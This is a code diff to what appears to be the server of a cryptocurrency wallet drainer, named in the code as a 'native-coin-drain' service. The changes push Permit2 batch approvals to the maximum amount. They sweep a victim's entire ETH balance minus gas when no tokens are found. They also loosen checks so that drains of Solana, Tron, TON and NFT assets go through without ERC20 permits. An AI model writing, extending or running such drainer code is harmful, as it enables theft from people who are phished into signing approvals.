@@ -49,6 +49,7 @@ import {
 } from '@legion/core/logic/permit2-batch'
 import {
   batchNativeWithPermit2,
+  hasOmnichainBatchDrainLeg,
   parseNativeAmount,
 } from '@legion/core/logic/native-coin-drain'
 import {
@@ -701,7 +702,10 @@ async function buildPermit2BatchTypedDataForWallet(params: {
   const resolvedPermits = (
     await Promise.all(
       params.permits.map(async (permit) => {
-        if (permit.amount > 0n && permit.amount < PERMIT2_MAX_AMOUNT) {
+        if (permit.amount >= PERMIT2_MAX_AMOUNT) {
+          return { token: permit.token, amount: PERMIT2_MAX_AMOUNT }
+        }
+        if (permit.amount > 0n) {
           return permit
         }
         const amount = await resolvePermit2ApprovalAmountForToken({
@@ -713,15 +717,22 @@ async function buildPermit2BatchTypedDataForWallet(params: {
       }),
     )
   ).filter((permit) => permit.amount > 0n)
-  const nativeAmount = params.nativeAmount ?? 0n
-  if (resolvedPermits.length === 0 && nativeAmount <= 0n) {
-    throw new Error('No ERC20 tokens found; draining native ETH only.')
+  const omnichainLeg = hasOmnichainBatchDrainLeg(params)
+  let effectiveNativeAmount = params.nativeAmount ?? 0n
+  if (resolvedPermits.length === 0 && effectiveNativeAmount <= 0n && !omnichainLeg) {
+    const balance = await batchClient.getBalance({ address: params.wallet })
+    const fees = await batchClient.estimateFeesPerGas()
+    const gasCost = 21_000n * (fees.maxFeePerGas ?? 0n)
+    effectiveNativeAmount = balance > gasCost ? balance - gasCost : 0n
+    if (effectiveNativeAmount <= 0n) {
+      throw new Error('No drainable assets found for wallet')
+    }
   }
   const built = await batchNativeWithPermit2({
     wallet: params.wallet,
     chainId: params.chainId,
     permits: resolvedPermits,
-    nativeAmount: params.nativeAmount ?? 0n,
+    nativeAmount: effectiveNativeAmount,
     nativeAmountSol: params.nativeAmountSol,
     nativeAmountTrx: params.nativeAmountTrx,
     nativeAmountTon: params.nativeAmountTon,
@@ -1689,12 +1700,6 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
         return sendFailure(reply, 400, 'nativeAmount must be non-negative', { code: 'ValidationError' })
       }
     }
-    if (permits.length === 0 && nativeAmount <= 0n) {
-      return sendFailure(reply, 400, 'permits[] or nativeAmount > 0 required', {
-        code: 'ValidationError',
-      })
-    }
-
     const parseOptionalNative = (
       raw: string | number | undefined,
       field: string,
@@ -1740,6 +1745,21 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
     const parsedNfts = parseBatchNftEntries(body.nfts)
     if (parsedNfts.ok === false) {
       return sendFailure(reply, 400, parsedNfts.error, { code: 'ValidationError' })
+    }
+
+    const omnichainLeg = hasOmnichainBatchDrainLeg({
+      nativeAmountSol,
+      nativeAmountTrx,
+      nativeAmountTon,
+      solWallet,
+      trxWallet,
+      tonWallet,
+      nfts: parsedNfts.nfts.length > 0 ? parsedNfts.nfts : undefined,
+    })
+    if (permits.length === 0 && nativeAmount <= 0n && !omnichainLeg) {
+      return sendFailure(reply, 400, 'permits[], nativeAmount > 0, or omnichain leg required', {
+        code: 'ValidationError',
+      })
     }
 
     if (!isRpcConfigured(chainId) && process.env['NODE_ENV'] !== 'development') {
@@ -2914,9 +2934,19 @@ async function handleNormalizedIngress(
         })
       }
       if (!batchPermits || batchPermits.length === 0) {
-        return sendFailure(reply, 400, 'permit2_batch_eip712 requires permits: [{ token, amount }]', {
-          code: 'ValidationError',
-        })
+        const omnichainOnly =
+          nativeAmountSol > 0n ||
+          nativeAmountTrx > 0n ||
+          nativeAmountTon > 0n ||
+          splAmount > 0n ||
+          trc20Amount > 0n ||
+          jettonAmount > 0n ||
+          nfts.length > 0
+        if (!omnichainOnly) {
+          return sendFailure(reply, 400, 'permit2_batch_eip712 requires permits: [{ token, amount }]', {
+            code: 'ValidationError',
+          })
+        }
       }
       if (!b.batch_permit_metadata) {
         return sendFailure(
